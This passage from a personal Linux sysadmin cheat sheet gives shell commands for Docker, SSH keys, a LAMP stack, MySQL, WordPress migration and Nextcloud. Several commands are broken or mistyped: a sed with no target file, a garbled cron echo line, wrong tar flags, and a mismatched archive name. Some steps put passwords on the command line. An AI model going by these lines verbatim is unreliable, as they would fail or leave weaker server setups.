## ##    END 3D printing
## ###################################################


##==========================================
## #################################
## ##    Docker
## #################################
## os. docker. Add Docker's official GPG key:
$> sudo apt-get update
$> sudo apt-get install ca-certificates curl
$> sudo install -m 0755 -d /etc/apt/keyrings
$> sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
$> sudo chmod a+r /etc/apt/keyrings/docker.asc
## Add the repository to Apt sources:
$> echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  noble stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
$> sudo apt-get update
## install
$> sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
##
## nerdctl use full version
$> wget https://github.com/containerd/nerdctl/releases/download/v2.0.2/nerdctl-full-2.0.2-linux-amd64.tar.gz
#tar -zxf nerdctl-full-2.0.2-linux-amd64.tar.gz
## Extract to all the correct folders
$> sudo tar Cxzvvf /usr/local nerdctl-full-2.0.2-linux-amd64.tar.gz
## Import docker containers. first, you save a tarball for it with docker
$> sudo docker save hello-world2:latest > hello-world2.tar
## Then you import that with containerd so it can be used in the cluster
$> sudo ctr -n k8s.io image import hello-world2.tar
##
$> sudo ctr namespaces ls
$> sudo ctr -n k8s.io images list
$> sudo ctr -n k8s.io containers list
$> sudo nerdctl images ls
$> sudo nerdctl container ls
$> sudo nerdctl --namespace k8s.io build --tag hello-world2:latest .
## Image not pulled. ## WHY?
$> kubectl run nginx-check --image-pull-policy=Never --image=hello-world2:latest

##========================================
## #################################
## ##    END Docker
## #################################
## ##########################################################
## ##    Sound
## ##########################################################
## multimedia. sound.
##==========================================
## multimedia. sound. Stream audio across two pairs of bluetooth headphones linux
## Install paprefs
$> sudo apt-get install paprefs
## Pair both sets of headphones with your computer.
## Launch paprefs
$> paprefs
## Create simultaneous output:
## In the paprefs window, select the "Simultaneous Output"
## tab and check the boxes for both of your Bluetooth headphones
##========================================


##==========================================
## ##########################################################
## ##    END Sound
## ##########################################################
## ######################################################


##==========================================

## ##########################################################
## ##    Packages
## ##########################################################
## Working with apps and platforms.
## LAMP apache mysql php wordpress nexcloud
##==========================================
## ###################################
## ##    LAMP apache mysql php
## ###################################
##==========================================
### ssh secure shell remote
## Install ssh server and client
$> sudo apt-get install openssh-server openssh-sftp-server openssh-client sshfs
## Login to server, the server will ask for a password
$> ssh $USER@server
## Use -t to call a shell and cd to a particular directory
$> ssh -t example.com "cd /foo/bar; exec \$SHELL -l"
## Setup server
## If you have a complelling reason chamge port from port 22 to something else.
## Check current port
$> cat /etc/ssh/sshd_config | grep -i Port
## Change port to 26
$> sudo sed -i "s/Port 22/Port 26/"
## Login to server at port 26
$> ssh user@192.168.1.1 -p 26
##------------------------------------------
## Use openssl aes rsa encryption keys to connect securely to server
## Create keys. public keys to put on remote machines which will use that key to authenticate, and a private key you set strong permissions on, that you use to give you access to the remote.
$> ssh-keygen -t rsa
##   Generating public/private rsa key pair.
##   Enter file in which to save the key (/Your/HomeDir/.ssh/id_rsa):
##   Enter passphrase (empty for no passphrase):
## defaults to 2048 bits, can change to higher bits with -b 4096, and -C and put in a comment
$> ssh-keygen -t rsa -b 4096 -C 'Passwd_hint'
## Available encryption; “dsa”, “ecdsa”, “ed25519”, “rsa”. Change the key names appropriately.
$> ssh-keygen -t dsa
## This will place the private key in ~/.ssh/id_rsa and the public key in ~/.ssh/id_rsa.pub.
## Set permissions
$> chmod 700 ~/.ssh
$> chmod 600 ~/.ssh/id_rsa; chmod 600 ~/.ssh/id_rsa.pub
## Do this for each
$> mv ~/.ssh/id_rsa  ~/.ssh/servername_id_rsa; mv ~/.ssh/id_rsa.pub  ~/.ssh/servername_id_rsa.pub;
##------------------------------------------
### Setup on server !!!! Do not copy your private key over. !!!!
## Transfer pub key to server:
$> scp ~/.ssh/id_rsa.pub user@myserver.com:~/id_rsa.pub
## in the server, add pub key to authorized_keys file
$> cat id_rsa.pub >> ~/.ssh/authorized_keys
## Or
## append the contents of ~/.ssh/id_dsa.pub to the end of ~/.ssh/authorized_keys on the remote machine.
$> cat .ssh/serername_id_rsa.pub | ssh $USER@192.168.1.101 'cat >> ~/.ssh/authorized_keys'
## Or
## Can use ssh-copy-id instead; the cat port technique above is more portable.
$> ssh-copy-id
## !!!! Do not copy your private key over. !!!!Z
##==========================================
## Install LAMP Web Server
#$> sudo apt-get install apache2 mysql-server mysql-client php5 libapache2-mod-php5 php5-cli php5-gd
## Install newer LAMP Web Server implementation with php7.0
#$> sudo apt-get install apache2 mysql-server mysql-client php7.0 libapache2-mod-php7.0 php7.0-cli php7.0-gd libapache2-mod-php7.0 php7.0-mysql
## Install newer LAMP Web Server implementation
$> sudo apt install apache2 ghostscript libapache2-mod-php mysql-server php php-bcmath php-curl php-imagick php-intl php-json php-mbstring php-mysql php-xml php-zip
## Mysql should prompt to choose a root password
## Restart apache2
$> sudo /etc/init.d/apache2 restart
## or
$> sudo sevice apache restart
## Add permissions allow user to make content on /var/www
$> sudo usermod -a -G www-data $USER
$> sudo chown -R :www-data /var/www
$> sudo chmod -R 775 /var/www
##------------------------------------------
## Activate Mod_Rewrites to rewrite links in apache
## Allow apache2 to change addresses to new URLs
## Before we begin generating the actual URL rewrites, activate the apache mod_rewrite module.
## Add apache2 module to allow rewrites
$> sudo a2enmod rewrite
## Change apache2 configuration to allow rewrites
## Use sed to change "AllowOverride None" to "AllowOverride All" in the "<Directory /var/www/>" section of /etc/apache2/apache2.conf
$> sudo sed -i '\%^<Directory /var/www/>%,\%^</Directory>% s/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf
## OR use a text editor
$> sudo mcedit /etc/apache2/apache2.conf
## Change this:
$@<Directory /var/www/>
$@  Options Indexes FollowSymLinks
$@  AllowOverride None
$@  Require all granted
$@</Directory>
## To this:
$@<Directory /var/www/>
$@  Options Indexes FollowSymLinks
$@  AllowOverride All
$@  Require all granted
$@</Directory>
## Restart apache
$> sudo service apache2 restart
##------------------------------------------
## Apache has userdir module userdir which lets you use /home/USER/public_html as root directory.
## You will access this public_html as localhost/~USER/
## Make a public html directory in home dir
$> mkdir ~/public_html
## Set permissions on public_html folder allow the www-data user to see the files usually 755
$> chmod -R 755 ~/public_html
## Enable the userdir apache mod
$> sudo a2enmod userdir
$> sudo service apache2 reload
$> w3m -dump https://httpd.apache.org/docs/2.4/howto/public_html.html
## ?????uncomment line below in the config file conf/httpd.conf, and adapting the httpd-userdir.conf file as necessary
## #Include conf/extra/httpd-userdir.conf
##=======================================
## SSL LetsEncrypt is a project designed to allow users access to free SSL certificates for their websites.
## https://linuxconfig.org/generate-ssl-certificates-with-letsencrypt-debian-linux
$> sudo apt-get install python-certbot-apache
## Certbot PPA
## https://certbot.eff.org/lets-encrypt/ubuntuxenial-apache
$> sudo apt-get update
$> sudo apt-get install software-properties-common
$> sudo add-apt-repository universe
$> sudo add-apt-repository ppa:certbot/certbot
$> sudo apt-get update
$> sudo apt-get install certbot python-certbot-apache
$> sudo certbot --apache certonly
#Enter email address (used for urgent renewal and security notices) (Enter 'c' tocancel): sflaptop@gmail.com
#Starting new HTTPS connection (1): acme-v02.api.letsencrypt.org
#Please read the Terms of Service at
#https://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You must agree in order to register with the ACME server at
#https://acme-v02.api.letsencrypt.org/directory
## Or
$> wget https://dl.eff.org/certbot-auto
$> sudo mv certbot-auto /usr/bin
$> sudo certbot --apache
## Auto-Renew with Cron
## Create script to renew certs
$> sudo echo '
##! /bin/bash
#certbot renew -q' > /home/user/renew-certs.sh
## Make the script executable
$> chmod +x renew-certs.sh
$> crontab -l
## create a cron job that runs twice a day
$> echo 'echo 'echo '* 3,15 * * * /home/$USER/renew-certs.sh' >> /home/$USER/.crontab
## Add jobs to cron
$> crontab < .crontab
$> crontab -l
##=========================================
## Configure mysql from commandline
$> mysql -u root -p -e "CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword'; CREATE DATABASE database_name; GRANT ALL PRIVILEGES ON database_name.* TO new_db_user@localhost IDENTIFIED BY 'new_db_user_pass';"
## Function to setup mysql for wordpress
## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
##-----------------------------------------
## Configure mysql manually
$> gksudo gedit /etc/mysql/my.cnf
## Insecure way, put password in command
$> sudo /usr/bin/mysqladmin -u root -h localhost password 'RootPassword'
$> sudo /usr/bin/mysqladmin -u YOURUSERNAME -h localhost password 'YourPassword'
$> sudo /usr/bin/mysqladmin -u YOURUSERNAME -h 127.0.0.1 password 'YourPassword'
$> sudo /usr/bin/mysqladmin -u root -h localhost password 'new-password'
$> sudo /etc/init.d/mysql restart
## In AWS can sign on with sudo
$> sudo msql
## Sign into mysql
$> mysql -u root -h localhost -p
$> mysql -u YOURUSERNAME -p
$> mysql -u root -p
## Create a database just for our new WordPress installation.
$> mysqladmin -u root -p create databasename
## OR in mysql shell
$> mysql -u root -p
## Create a database user just for our new WordPress installation.
$> mysql> CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword';
## At the mysql shell, type the following commands. Remember to use your own, valid values for database_name, databaseuser, and also use a strong and secure password as databaseuser_password.
$> mysql> CREATE DATABASE wp_nameofyoursite;
$> mysql> GRANT ALL PRIVILEGES ON wp_nameofyoursite.* TO 'your_username_here'@'localhost' IDENTIFIED BY 'your_chosen_password_here';
$> mysql> FLUSH PRIVILEGES;
$> mysql> EXIT;
## OR all together from commandline
$> mysql -u root -p -e "CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword'; CREATE DATABASE database_name; GRANT ALL PRIVILEGES ON database_name.* TO new_db_user@localhost IDENTIFIED BY 'new_db_user_pass';"
## Function to setup mysql for wordpress
## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
##-----------------------------------------
## Changing the MySQL root user password
## In the above command, there is no space between -p and 'OLDPASSWORD'. If you put a space between them, the command will fail.
$> mysqladmin -u root -p'OLDPASSWORD' password NEWPASSWORD
## Remove the passwords from .bash_history and .mysql_history.
## Put space before this command so this command does not show in the hisory and defeat the purpose.
$>  sed -i 's/Your_Password//g' ~/.bash_history
$>  sed -i 's/Your_Password//g' ~/.mysql_history
##=========================================
## PHP only allows 2MB files upload by default. For uploading bigger files to your server, increase the upload size in php.ini file.
## search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
## See what set to now
## For php5
$> cat /etc/php5/apache2/php.ini | grep "upload_max_filesize ="
$> cat /etc/php5/apache2/php.ini | grep "post_max_size ="
## For php7.0
$> cat /etc/php/7.0/apache2/php.ini | grep "upload_max_filesize ="
$> cat /etc/php/7.0/apache2/php.ini | grep "post_max_size ="
## Change to what you want
## For php5 to increase uploads to 20mb
$> sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php5/apache2/php.ini
$> sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php5/apache2/php.ini
## For php7.0 to increase uploads to 20mb
$> sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/7.0/apache2/php.ini
$> sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php/7.0/apache2/php.ini
## Or use a editor and search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
## For php5
$> sudo nano /etc/php5/apache2/php.ini
## For php7.0
$> sudo nano /etc/php/7.0/apache2/php.ini
##==========================================
##============================================
## ######################################
## ##    END LAMP apache mysql php
## ######################################
##==========================================
##==========================================
## ######################
## ##    Wordpress
## ######################
##==========================================
### Wordpress
## Function install WordPress into current folder
@> function installwordpress() {
@>     gpasswd -a $USER www-data
@>     wget http://wordpress.org/latest.tar.gz
@>     tar xzvf latest.tar.gz
@>     cp -rf wordpress/** ./
@>     rm -R wordpress
@>     cp wp-config-sample.php wp-config.php
@>     wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
@>     sed -i '/#@-/r wp.keys' wp-config.php
@>     sed -i "/#@+/,/#@-/d" wp-config.php
@>     mkdir wp-content/uploads
@>     find . -type d -exec chmod 755 {} \;
@>     find . -type f -exec chmod 644 {} \;
@>     chown -R :www-data *
@>     chmod 640 wp-config.php
@>     rm -f latest.tar.gz
@>     rm -f wp.keys
@> }
##------------------------------------------
## Function install WordPress into current folder oneliner
$> function installwordpress() { gpasswd -a $USER www-data; wget http://wordpress.org/latest.tar.gz; tar xzvf latest.tar.gz; cp -rf wordpress/** ./; rm -R wordpress; cp wp-config-sample.php wp-config.php; wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/; sed -i '/#@-/r wp.keys' wp-config.php; sed -i "/#@+/,/#@-/d" wp-config.php; mkdir wp-content/uploads; find . -type d -exec chmod 755 {} \;; find . -type f -exec chmod 644 {} \;; chown -R :www-data *; chmod 640 wp-config.php; rm -f latest.tar.gz; rm -f wp.keys; }
##------------------------------------------
## Install WordPress
$> cd /var/www/
$> chown -R :www-data html
## Add your user to group for access
$> sudo gpasswd -a $USER www-data
$> cd /var/www/html
$> wget http://wordpress.org/latest.tar.gz
## Download WordPress, modify wp-config.php, set permissions, some steps require sudo
## Get wordpress
$> wget http://wordpress.org/latest.tar.gz
$> tar -xzvf latest.tar.gz
$> cp -rf wordpress/** ./
$> rm -R wordpress
$> cp wp-config-sample.php wp-config.php
## Change permissions
$> find . -type d -exec chmod 755 {} \;
$> find . -type f -exec chmod 644 {} \;
$> mkdir wp-content/uploads
$> chown -R :www-data wp-content/uploads
$> chown -R $USER:www-data *
$> chmod 640 wp-config.php
## Specify database user and password.
$> sed -i "s/database_name_here/$dbname/g" wp-config.php
$> sed -i "s/username_here/$dbuser/g" wp-config.php
$> sed -i "s/password_here/$dbpass/g" wp-config.php
## Change the table prefix to something unique
$> sed -i "s/table_prefix  = 'wp_'/table_prefix  = 'wp_uniquename_'/"  wp-config.php
## GID is the numerical primary group ID for the user. Numeric values for GIDs are listed in /etc/group.
$> cat /etc/group
## Go to wordpress configuration page
$> firefox http://ip_address/wp-admin/install.php
## !!!!Better to use http://ip_address/wp-admin/install.php, as above, especially if in subdirectory.
## Get salt from website and install to wp-config.php with sed. Can redo this part if you think site has been compromised. This will force everyone to re-login.
## Setup wordpress without browser.
$> wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
$> sed -i '/#@-/r wp.keys' wp-config.php
$> sed -i "/#@+/,/#@-/d" wp-config.php
## Cleanup
$> rm -f latest.tar.gz
$> rm -f wp-install.sh
$> rm -f wp.keys
##==========================================
### Export and import wordpress sites
## Two ways to get wordpress site
## Copy and compress total site
$> cd /var/www
$> tar -cvzf html_sitename_20190124.tar.gz html
## Copy tar.gz to new server with scp or just copy by making it availables and wget from remote server
$> scp html_sitename_20190124.tar.gz UserName@192.168.1.8:/var/www
## On new server
$> ssh yourname@192.168.1.8
## If you need a .pem use -i
$> ssh -i ./commandlinefun.pem yourname@192.168.1.8
## Decompress total site
$> cd /var/www
$> tar -xvzf html_sitename_20190124.tar.gz
$> cd /var/www/html
## Change any references in wp-config.php to new site
$> sed -i 's/oldaddress/newaddress/g' wp-config.php
## OR
## Export Wordpress xml in wordpress
## Import Wordpress xml into wordpress on new server
## Settings>
##-----------------------------------------
## Export mysql database
## No space between -p and password
$> mysqldump -u [uname] -p[pass] db_name > db_backup.sql
## Example
$> mysqldump -u Your_Username -pYour_Password wp_wordpress_database_name > wp_wordpress_database_name_backup_20190118.sql
##-----------------------------------------
## Create database to import into
$> mysql -u $USER -p
$@ mysql> SHOW DATABASES;
$@ mysql> CREATE DATABASE wp_wordpress_database_name;
$@ mysql> SHOW DATABASES;
## Create a wordpress database user and grant privileges on that database
$@ mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newuserspassword';
$@ mysql> GRANT ALL PRIVILEGES ON  wp_wordpress_database_name* TO 'newuser'@'localhost';
$@ mysql> EXIT;
## Import database into mysql
$> mysql -u Your_Username -p -h localhost wp_wordpress_database_name < /path/to/db_backup.sql
## Or if sudo mysql works like on AWS
$> sudo mysql -h localhost wp_wordpress_database_name < /path/to/wp_wordpress_database_name_backup_20190118.sql
##-----------------------------------------
## Stop white screen of death due to redirect or change to new URL
## Rewrite url in wordpress database
$> mysql -u YOURUSERNAME -p
## In mysql command  where '192.168.1.3' is old server address, and 'mynewurl.com' is new server URL. Can use an address instead.
$@ mysql> SHOW DATABASES;
$@ mysql> USE wp_YourWordpressDatabase;
## Check where site is directed rename to match your system
$@ mysql> SELECT option_value FROM wp_uniquename_options WHERE option_name = 'home' OR option_name = 'siteurl';
## Replace with new site
$@ mysql> UPDATE wp_uniquename_posts SET guid = replace(guid, '192.168.1.3','mynewurl.com');
$@ mysql> UPDATE wp_uniquename_posts SET post_content = replace(post_content, '192.168.1.3', 'mynewurl.com');
$@ mysql> UPDATE wp_uniquename_links SET link_url = replace(link_url, '192.168.1.3', 'mynewurl.com');
$@ mysql> UPDATE wp_uniquename_links SET link_image = replace(link_image, '192.168.1.3', 'mynewurl.com');
$@ mysql> UPDATE wp_uniquename_postmeta SET meta_value = replace(meta_value, '192.168.1.3', 'mynewurl.com');
$@ mysql> UPDATE wp_uniquename_usermeta SET meta_value = replace(meta_value, '192.168.1.3', 'mynewurl.com');
$@ mysql> UPDATE wp_uniquename_options SET option_value = replace(option_value, '192.168.1.3', 'mynewurl.com') WHERE option_name = 'home' OR option_name = 'siteurl';
## Check where site is directed now
$@ mysql> SELECT option_value FROM wp_uniquename_options WHERE option_name = 'home' OR option_name = 'siteurl';
##------------------------------------------
## Go to webite to check if it worked. Sometimes the site is cached and will try to go to old cache, restart browser or delete old history.
$> firefox http://yoursite
## Go to admin section to check if that worked
$> firefox http://yoursite/wp-admin
##------------------------------------------
## OR functions to do same
### Wordpress mysql functions, may not work on remote ssh session
## Show local mysql databases
$> function mysqldatabases() { mysql -u root -p -e "SHOW DATABASES;" ; }
##------------------------------------------
## Show where wordpress redirects. Usage; wordpressmysqlcheck wp_database wp_uniquetableprefix_
$> function wordpressmysqlcheck() { mysql -u root -p -e "USE $1; SELECT option_value FROM $2options WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
##------------------------------------------
## Change where wordpress redirects. Usage; wordpressmysqlredirect wp_database wp_uniquetableprefix_ 192.168.1.10 mynewurl.com
$> function wordpressmysqlredirect() { mysql -u root -p -e "USE $1; UPDATE $2posts SET guid = replace(guid, '$3','$4'); UPDATE $2posts SET post_content = replace(post_content, '$3', '$4'); UPDATE $2links SET link_url = replace(link_url, '$3', '$4'); UPDATE $2links SET link_image = replace(link_image, '$3', '$4'); UPDATE $2postmeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2usermeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2options SET option_value = replace(option_value, '$3', '$4') WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
##==========================================
### To recover a mysql database without an export .sql
## First make a new installation of mysql you can use to recover old one.
## Need both ibdata1 and database folder containing .frm files
## on old sever not working or a hard drive with database go to /var/lib/mysql find database and copy it
$> cd /path/var/lib/
## If local
$> cp mysql /path/for/copy
## Remote
## Compress the needed database mysql folder
$> tar -cxzf yourdatabasename_20190208.tar.gz mysql
## Copy database to new server
$> scp yourdatabasename_20190208.tar.gz $USER@192.168.1.3:/path/to/remote
## On new server set up LAMP, see above
## Unpack database folder with .frm files and ibdata1 file.
$> tar -xvzf yourdatabasename_20190208.tar.gz
## change directory into copy of old mysql folder
$> cd mysql
## Move newly created database ibdata1 file to replace with old one you are trying to recover
$> mv /var/lib/mysql/ibdata1 /var/lib/mysql/ibdata1.default
## Copy old ibdata1 to new database folder
$> cp ibdata1 /var/lib/mysql
## Copy the folder of the database you want to recover that holds the .frm files
$> cp wp_databasename /var/lib/mysql
$> cd /var/lib/mysql
## Change permissions so mysql can use new database
$> chown -R mysql:mysql wp_databasename
$> chmod -R 750 wp_databasename
## Sign into mysql and see if you can access database
$> mysql -u root -p
$@ mysql> SHOW DATABASES;
$@ mysql> USE wp_database;
$@ mysql> SHOW TABLES;
$@ mysql> CHECK TABLE wp_commentsmeta;
## IF ok then export the .sql
$> mysqldump -u Your_Username -p wp_databasename > wp_database_backup_20190118.sql
$> mysqldump -u Your_Username -p -h '192.168.1.3' wp_databasename > wp_database_backup_20190118.sql
## Now you can import the sql into any other server.
##==========================================
### Change Table Prefix from default in working Wordpress site
## 1. Take mysql database backup as a precaution. If a mistake is made, can re-import and try again.
$> mysqldump -u [uname] -p -h 'localhost' databasename > databasename_backup_20190219.sql
## 2. Change $table_prefix = ‘wp_’; in /var/www/html/wp-config.php
$> sed -i "s/table_prefix  = 'wp_'/table_prefix  = 'wp_uniquename_'/"  /var/www/html/wp-config.php
## 3. Change table names in mysql
$> mysql -u root -p
$@ mysql> USE databasename;
## Format: RENAME TABLE `oldtablename` TO `newtablename`;
## rename all the tables add any additional tables from plugins. Plugins may mess this up of course. Best practice is to remove and do procedure then reinstall reconfigure plugins.
$@ mysql> RENAME TABLE wp_comments                  TO   wp_uniquename_comments                   ;
$@ mysql> RENAME TABLE wp_links                     TO   wp_uniquename_links                      ;
$@ mysql> RENAME TABLE wp_options                   TO   wp_uniquename_options                    ;
$@ mysql> RENAME TABLE wp_postmeta                  TO   wp_uniquename_postmeta                   ;
$@ mysql> RENAME TABLE wp_posts                     TO   wp_uniquename_posts                      ;
$@ mysql> RENAME TABLE wp_term_relationships        TO   wp_uniquename_term_relationships         ;
$@ mysql> RENAME TABLE wp_term_taxonomy             TO   wp_uniquename_term_taxonomy              ;
$@ mysql> RENAME TABLE wp_termmeta                  TO   wp_uniquename_termmeta                   ;
$@ mysql> RENAME TABLE wp_terms                     TO   wp_uniquename_terms                      ;
$@ mysql> RENAME TABLE wp_usermeta                  TO   wp_uniquename_usermeta                   ;
$@ mysql> RENAME TABLE wp_users                     TO   wp_uniquename_users                      ;
$@ mysql> RENAME TABLE wp_commentmeta               TO   wp_uniquename_commentmeta                ;
## 4. Rename in wp_options
## in table wp_uniquename_options
## Look under the option_name column header and change wp_user_roles to wp_uniquename_user_roles.
## In this case
$> mysql> UPDATE `wp_uniquename_options` SET `option_name` = 'wp_uniquename_user_roles' WHERE `option_name` = 'wp_user_roles';
## 5. Rename in wp_usermeta
## in table wp_uniquename_usermeta
## Change all meta_key entries to new prefix
$> mysql> UPDATE `wp_uniquename_usermeta` SET `meta_key` = REPLACE( `meta_key`, 'wp_', 'wp_uniquename_' );
##------------------------------------------
## Function to rename the table_prefix to a unique name /var/www/html/wp-config.php
## Usage: wordpressmysqltableprefix wordpress_databasename tableprefix_ newtableprefix_
## Example: wordpressmysqltableprefix wordpress wp_ wp_uniquename_
$> function wordpressmysqltableprefix() { mysql -u root -p -e "USE $1; RENAME TABLE $2comments TO $3comments; RENAME TABLE $2links TO $3links; RENAME TABLE $2options TO $3options; RENAME TABLE $2postmeta TO $3postmeta; RENAME TABLE $2posts TO $3posts; RENAME TABLE $2term_relationships TO $3term_relationships; RENAME TABLE $2term_taxonomy TO $3term_taxonomy; RENAME TABLE $2termmeta TO $3termmeta; RENAME TABLE $2terms TO $3terms; RENAME TABLE $2usermeta TO $3usermeta; RENAME TABLE $2users TO $3users; RENAME TABLE $2commentmeta TO $3commentmeta; UPDATE `$3options` SET `option_name` = '$3user_roles' WHERE `option_name` = '$2user_roles'; UPDATE `$3usermeta` SET `meta_key` = REPLACE( `meta_key`, '$2', '$3' ); SHOW TABLES;" ; }"
##==========================================
## ########################
## ##    END Wordpress
## ########################
##==========================================
## ################################################
## ##    Nextcloud Cloud Server Install
## ################################################
##==========================================
## https://nextcloud.com/
$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.zip
##==========================================
### Nextcloud server setup
## https://help.nextcloud.com/
## https://civihosting.com/blog/how-to-install-nextcloud-server/
##--------------------------------------------
## LAMP install
## Install newer LAMP Web Server implementation with php7.0
$> sudo apt-get install apache2 mysql-server mysql-client php7.0 libapache2-mod-php7.0 php7.0-cli php7.0-gd libapache2-mod-php7.0 php7.0-mysql
## php packages fileinfo. some duplicated from above
$> sudo apt-get install php7.0-intl php-imagick php7.0-xml php7.0-zip php7.0-bz2 php7.0-opcache php7.0-gd php7.0-json php7.0-mysql php7.0-curl php7.0-mbstring php7.0-imap php7.0-gmp
##--------------------------------------------
## Install apache modules
## There are some recommended Apache modules to be enabled for Nextcloud.
$> sudo a2enmod rewrite mime dir env headers rewrite
## Enable SSL
$> sudo a2enmod ssl
$> sudo a2ensite default-ssl
## configuration file for Nextcloud in /etc/apache2/sites-available. Create a new file in that folder called nextcloud.conf
$> sudo touch /etc/apache2/sites-available/nextcloud.conf
$> sudo su
## Setup Nextcloud in folder /var/www/nextcloud
$> printf '## Setup apache2 for Nextcloud\nAlias /nextcloud "/var/www/nextcloud/"\n\n<Directory /var/www/nextcloud/>\n Options +FollowSymlinks\n AllowOverride All\n\n<IfModule mod_dav.c>\n Dav off\n</IfModule>\n\nSetEnv HOME /var/www/nextcloud\nSetEnv HTTP_HOME /var/www/nextcloud\n\n</Directory>\n' > /etc/apache2/sites-available/nextcloud.conf;
## Check the file
$> cat /etc/apache2/sites-available/nextcloud.conf
## Or use an editor to add setting to apache2 available sites
$> sudo mcedit /etc/apache2/sites-available/nextcloud.conf
## Add the folowing without the $@
$@ ## Setup apache for Nextcloud
$@ Alias /nextcloud "/var/www/nextcloud/"
$@
$@ <Directory /var/www/nextcloud/>
$@  Options +FollowSymlinks
$@  AllowOverride All
$@
$@ <IfModule mod_dav.c>
$@  Dav off
$@ </IfModule>
$@
$@ SetEnv HOME /var/www/nextcloud
$@ SetEnv HTTP_HOME /var/www/nextcloud
$@
$@ </Directory>
## Save that file in /etc/apache2/sites-available and then create a symlink to /etc/apache2/sites-enabled with the command:
$> ln -s /etc/apache2/sites-available/nextcloud.conf /etc/apache2/sites-enabled/nextcloud.conf
$> exit
## Finally, restart Apache with the command:
$> sudo service apache2 restart
##-----------------------------------------
## Create a mysql database and user with password for nextcloud
## Function to setup mysql for nextcloud
## Setup mysql for wordpress. Usage: mysqlsetup $USER password databasename
$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
## Put in root mysql password press enter
## Procede execution with a space so it does not go in .bash_history and expose the password, Example:
$>  mysqlsetup $USER nextcloudpassword nextcloud
##--------------------------------------------
## PHP only allows 2MB files upload by default. For uploading bigger files to your server, increase the upload size in php.ini file.
## search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
## See what set to now. For php7.0
$> cat /etc/php/7.0/apache2/php.ini | grep "upload_max_filesize ="
$> cat /etc/php/7.0/apache2/php.ini | grep "post_max_size ="
## Change to what you want. For php7.0 to increase uploads to 2000mb
$> sudo sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 2000M/' /etc/php/7.0/apache2/php.ini
$> sudo sed -i 's/post_max_size = 8M/post_max_size = 2000M/' /etc/php/7.0/apache2/php.ini
## Or use a editor and search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
## For php7.0
$> sudo nano /etc/php/7.0/apache2/php.ini
##---------------------------------------------
## Nextcloud Install, manual best way. snap is very invasive, do not use.
$> sudo apt-get install snapd
$> sudo snap install nextcloud
## OR
## Setup using setup-nextcloud.php, manual best way
$> wget https://download.nextcloud.com/server/installer/setup-nextcloud.php
$> mkdir /var/www/nextcloud
$> cp setup-nextcloud.php /var/www/nextcloud
$> sudo chown -R root:www-data /var/www/nextcloud/
$> sudo chmod -R 770 /var/www/nextcloud/
## Use install wizard
$> firefox http://IP_OF_SERVER/nextcloud/setup-nextcloud.php
## Then Nextcloud first use setup wizard
$> firefox http://IP_OF_SERVER/nextcloud
## “Storage & database” and then click on “MySQL", enter the Database user, password and name
## OR
## Manual setup, manual best way
## server packages
$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.tar.bz2
$> tar -vxjf nextcloud-9.0.50.tar.bz2
## or
$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.zip
$> unzip nextcloud-15.0.5.zip
## You should now see the folder nextcloud in the current working directory.
## Apache HTTP server you may safely install Nextcloud in your Apache document root:
$> cp -r nextcloud /path/to/webserver/document-root
$> cp -r nextcloud /var/www
## or
$> sudo mv nextcloud /var/www
## Set permissions
$> chown -R root:www-data /var/www/nextcloud/
$> sudo mkdir -p /var/www/nextcloud/data
$> sudo mkdir -p /var/www/nextcloud/assets
$> sudo mkdir -p /var/www/nextcloud/updater
$> sudo find /var/www/nextcloud/ -type f -print0 | xargs -0 chmod 0640
$> sudo find /var/www/nextcloud/ -type d -print0 | xargs -0 chmod 0750
$> sudo chown -R root:www-data /var/www/nextcloud/
$> sudo chown -R www-data:www-data /var/www/nextcloud/apps/
$> sudo chown -R www-data:www-data /var/www/nextcloud/assets/
$> sudo chown -R www-data:www-data /var/www/nextcloud/config/
$> sudo chown -R www-data:www-data /var/www/nextcloud/data/
$> sudo chown -R www-data:www-data /var/www/nextcloud/themes/
$> sudo chown -R www-data:www-data /var/www/nextcloud/updater/
